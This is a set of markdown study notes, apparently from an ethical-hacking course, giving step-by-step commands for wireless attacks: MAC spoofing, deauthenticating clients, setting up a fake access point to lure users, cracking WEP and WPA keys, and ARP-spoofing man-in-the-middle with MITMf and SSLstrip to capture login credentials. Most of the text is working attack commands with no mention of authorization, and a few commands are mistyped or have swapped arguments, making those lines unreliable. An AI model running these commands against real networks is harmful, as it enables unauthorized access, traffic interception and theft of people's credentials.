
## Change MAC Address (Media Access Control)

```bash
iwconfig                         # list wifi network cards (1st column has the network card INTERFACE: for instance "wlan0")
ifconfig [INTERFACE] down        # disable network card
macchanger --help                # print help
macchanger -m [MAC] [INTERFACE]  # change MAC Address
ifconfig [INTERFACE] up          # re-enable network card
```





## Monitor network

* A usb wifi network card which supports monitor mode
* Once "monitor" mode is enabled, the adapter will loose the connection 



### Method 1 : airmon-ng

```bash
# list wifi network cards (1st column has the network card INTERFACE: for instance "wlan0")
# Mode will be "Managed" since monitor is not enabled yet for that network card
iwconfig

# Enable monitor mode
airmon-ng start [interface]
```

output:

```
Interface		Chipset				Driver
wlan0			Atheros AR9271		ath9k - [phy0]
								   (monitor mode enabled on mon0)
```

```bash
# Start airodump-ng
airodump-ng [interface]
```

```bash
# list wifi network cards (1st column has the network card INTERFACE: for instance "wlan0")
# Mode will be now "Monitor"
# "mon0" comes from the "airmon-ng start [interface]" command
iwconfig mon0
```



for stopping the monitor:

```bash
airmon-ng stop mon0
```





### Method 2 : iwconfig

```bash
# list wifi network cards (1st column has the network card INTERFACE: for instance "wlan0": for instance "wlan0")
# Mode will be "Managed" since monitor is not enabled yet for that network card
iwconfig

# disable network card
ifconfig [INTERFACE] down

ifconfig [INTERFACE] mode monitor

# re-enable network card
ifconfig [INTERFACE] up

# start monitor
airmon-ng start [INTERFACE]
```





### Method 3 : kill process that interfere

```bash
# list network cards with info
airmon-ng

# disable network card
ifconfig [INTERFACE] down

# kill all process that may interfere
airmon-ng check kill

# start monitor
airmon-ng start [INTERFACE]

#  
ifconfig [INTERFACE]mon

# Check Mode:Monitor
iwconfig 
```



## Packet sniffing: airodump-ng

```bash
# enable monitor mode
airmon-ng start [INTERFACE]

# list networks around us
airodump-ng [INTERFACE]
```



### Sniff a target

```bash
airodump-ng --channel [CHANNEL] --bssid [MAC] --write [FILENAME] [INTERFACE MONITOR MODE]
```

The output will be similar to `airodump-ng [INTERFACE]` but only target info will be shown.

In addition, a section is printed with the full list of Access point's clients:

`BSSID`: MAC Access Point, `STATION`: MAC Client, `PWR`: Signal Power, `Rate`: Device Max Speed the device is running on, `Lost`: packages we lost, `Frames`: useful packages collected, `Probe`: - 



**Output:**

* -01.cap
* -01.csv
* -01.kismet.csv
* -01.kismet.netxml



### Analyze output

Open `.cap` file with wireshark





## Deauthentication Attack (Disconnecting Any Device From The Network)

Disconnect any device from any network within our range


* Disconnect all clients

    ```bash
    aireplay-ng --deauth [number of packets] -a [MAC AP] [INTERFACE]
    ```



* Disconnect a specific client

    ```bash
    # spoof device for seeing which devices are connected to the network
    airodump-ng --channel [CHANNEL] --bssid [MAC AP] [MONITOR INTERFACE: e.g. mon0]
    
    aireplay-ng --deauth [number of packets] -a [MAC AP] -c [MAC TARGET] [INTERFACE]
    ```



## Create a fake access point

**Requirements:**

* 2 network cards: one for the internet, the other for the broadcast

The aim is to attract people to connect to it and sniff data

```bash
# starts an AP with NO internet connection
start-noupstream

# starts an AP using the internet connection in the upstream interface
start-nat-simple

# starts an AP using the internet connection and will start sniffing and recording traffic
# usually it fails
start-nat-full
```



* Install mana-toolkit

  ```bash
  apt-get install mana-toolkit
  ```

* Edit `/etc/mana-toolkit/hostapd-mana.conf`

  ```bash
  leafpad /etc/mana-toolkit/hostapd-mana.conf
  ```



  * Check if `interface` matches with the broadcast AP name (e.g.: `wlan0`)
  * You can change the broadcast AP MAC with `bssid`
  * You can change the wifi name with `ssid`

* Edit `/usr/share/mana-toolkit/run-mana/start-nat-simple.sh`

  ```bash
  leafpad /usr/share/mana-toolkit/run-mana/start-nat-simple.sh
  ```



  * Check if `upstream` matches with internet connection network card name
  * Check if `phy` matches with the wireless card name (broadcast AP)

* Run `/usr/share/mana-toolkit/run-mana/start-nat-simple.sh`

  ```bash
  bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh 
  ```

  > If it fails, press Enter for killing it and run it again

* Connect any device to the new network. The traffic can now be sniffed



## Gaining Access

Wifi networks are (usually) protected by password. This is encrypted with one of the following methods:

* WEP : *explanation* 128bit and 46bit
* WPA
* WPA2



### Crack WEP

Oldest one

Easiest the break

Each package is encrypted with a 24bit Initialization Vector (IV)  which is always the same for all packages.

For cracking this kind of protocol, we collect a number of packages in order to guess the key.

#### Crack WEP encrypted wireless - Busy network

```bash
# list networks around us
airodump-ng [MONITOR-INTERFACE: e.g.: mon0] 

# sniff traffic in order to get the key, based on number of IVs found
airodump-ng --bssid [MAC] --channel [CHANNEL] --write [OUTPUT-FILE] [MONITOR-INTERFACE: e.g.: mon0] 

# analyse the file and crack the network
aircrack-ng [OUTPUT-FILENAME-USED-ABOVE-01.cap: e.g.: basic-test-ap-01.cap]
```



The command will fail if the number of **IVs** is not enough. It will start again automatically, just wait!

Once the key is found, the output will prompt the wifi password. Just use it connect it, removing the colon (**:**).



#### Crack WEP encrypted wireless - No busy network: Fake authentication

In this case we inject packets into the network, in order to force the target to send packets.

```bash
# Authenticate our MAC in order to let the Target not to ignore our packets
aireplay-ng --fakeauth 0 -a [MAC-TARGET] -h [MAC-MY-CARD] [MONITOR-INTERFACE: e.g.: mon0] 

# Inject packets
aireplay-ng --arpreplay -b [MAC-TARGET] -h [MAC-MY-CARD] [MONITOR-INTERFACE: e.g.: mon0]
# the command will display the output file (.cap) which needs to be used in the next command

# analyse the file and crack the network
aircrack-ng [OUTPUT-FILENAME-USED-ABOVE-01.cap: e.g.: basic-test-ap-01.cap]
```





### Crack WPA

Unlike WEP, for WPA encryption, each package is encrypted with a *unique temporary key.*

This means the number of packages we collect is irrelevant, since there are no useful info for guess the key.

#### Method 1: use WPS attack

Very difficult to crack. As weakness is used the WPS feature (it's a router's weakness, not a protocol one)

```bash
# list network with WPS around us
wash -i [MONITOR-INTERFACE: e.g.: mon0]
```

`WPS Locked` says if the router is going to block attempts after some failed in order to block brute attacks.

```bash
reaver -b [MAC-TARGET] -c [CHANNEL] -i [MONITOR-INTERFACE: e.g.: mon0] 
```

The output will show the WPA key.

> There are some additional **reaver** options which can be used for handling router which have protection against brute attacks (see **WPS Locked**)
>
> * `-d`, `--delay`: Set delay between pin attempts
> * `-l`, `--lock`: Set the time t wait if the AP locks WPS pin attempts
> * `-r`, `--recurring-delay`: Sleep for y seconds after x pin attempts



#### Method 2: use the handshake packages

The handshake packages are shared every time the client connects to the AP

1. Capture the handshake packet
   1. List clients
   2. Force a disconnection for few seconds, in order to let the client re-connect automatically
   3. At this stage, handshake packets are shared

    ```bash
    # list networks
    airodump-ng
   
    # filter traffic for the TARGET in order to get a client connected [KEEP RUNNING]
    airodump-ng --bssid [MAC-TARGET] --channel [CHANNEL] --write [OUTPUT-FILE] [MONITOR-INTERFACE: e.g.: mon0]
   
    # disconnect the client
    aireplay-ng --deauth [NUMBER-OF-PACKET] -a [MAC-AP] -c [MAC-CLIENT-TO-DISCONNECT] [MONITOR-INTERFACE: e.g.: mon0]
    ```

    > **NUMBER-OF-PACKET** must be low, since we only want to disconnect for few seconds

    Once `aireplay-ng --deauth` is run, the output  of the previous `airodump-ng` (which must be kept running) displays the **WPA handshake**

   

2. Create wordlist

   ```bash
   crunch [min] [max] [characters=lower|upper|numbers|symbols] -t [pattern] -o [file]
   
   # example
   crunch 6 8 123456!"£$% -t a@@@@b -o wordlist
   ```

   

3. Find the Key

   ```bash
   aircrack-ng [FILE-01.cap-WHICH-CONTAINS-THE-HANDSHAKE] -w [WORDLIST-FILE]
   # [FILE-01.cap-WHICH-CONTAINS-THE-HANDSHAKE] is the [OUTPUT-FILE] of `airodump-ng --bssid` command 
   
   aircrack-ng test-handshake-01.cap -w wap-wordlist
   ```

   

4. The output will display the Password



## Post Connection

### discover connected clients

#### netdiscover

```bash
netdiscover -i [INTERFACE] -r [RANGE]

# example
netdiscover -i wlan0 -r 192.168.1.1/24

# output
IP				At MAC Address			Count		Len		MAC Vendor
.........................................................................
```



#### autoscan

* download from: http://autoscan-network.com/download
* v. 1.50 has a bug, download 1.42
* 

##### Installation

```bash
# add support for 32bit applications
dpkg --add-architecture i386
apt-get update
apt-get install libc6:i386

# install the downloaded package
./autoscan-network-1.42-Linux-x86-Install
```



#### nmap (Network mapper)

* `Zenmap` : GUI Application for nmap
  * Run `quick scan` for basic details
  * Run `quick scan plus` for more advanced info
  * With `services` tab results can be filtered by service



### MITM

#### ARP Poisoning/Spoofing

Redirect traffic to flow through our device.

It takes advance of some ARP security issues:

* Each ARP request/response is trusted
* Clients accept response even if they did not send any request



##### arpspoof

1. Tell the target client that I am the router

    ```bash
    arpsppof -i [INTERFACE] -t [TARGET-IP] [AP-IP]
    
    # example
    arpsppof -i wlan0 -t 192.168.1.1 192.168.1.69
    ```

   

2. Tell the AP that I am the target client

    ```bash
    arpsppof -i [INTERFACE] -t [AP-IP] [TARGET-IP]
    
    # example
    arpsppof -i wlan0 -t 192.168.1.69 192.168.1.1
    ```

   

3. Enable IP forward to allow packets to flow through our devices without being dropped

    ```bash
    Echo 1 > /proc/sys/net/ipv4/ip_forward
    ```

   

4. As training check, run `arp -a` command table in order to display the arp table and see that the router MAC is changed (the new one is the spoofing machine)



##### MITMf

```bash
# Install it (not shipped with Kali)
apt-get update
apt-get install mitmf

# spoof 
mitmf --arp --spoof --gateway [GATEWAY-IP] --target [TARGET-IP] -i [INTERFACE]

```



* From the client machine login to www.carzone.ie => from the machine where the `mitmf` command has been run login credentials are displayed
* In case of https website, `mitmf` will start `SSLstrip` in order to bypass the https protocol. The user will not notice it, since no warnings are displayed. However in the address bar the https is not shown!


